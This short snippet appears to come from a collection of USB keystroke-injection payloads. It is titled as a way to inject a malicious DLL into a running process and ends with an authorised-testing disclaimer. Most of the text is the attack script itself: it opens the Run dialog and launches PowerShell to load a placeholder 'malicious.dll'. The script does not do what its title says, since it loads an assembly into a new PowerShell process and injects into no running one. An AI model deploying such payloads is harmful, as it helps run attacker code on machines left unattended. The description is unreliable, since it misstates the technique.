# Injecting a DLL into a Running Process

Injects a malicious DLL into a running process using PowerShell.

```
DELAY 500
GUI r
DELAY 200
STRING powershell -Command "[System.Reflection.Assembly]::LoadFrom('C:\\path\\to\\malicious.dll')"
ENTER
```

> Disclaimer: This script is for educational purposes and should only be used in environments where you have explicit authorization to perform penetration testing. Always follow ethical guidelines and laws governing cybersecurity practices.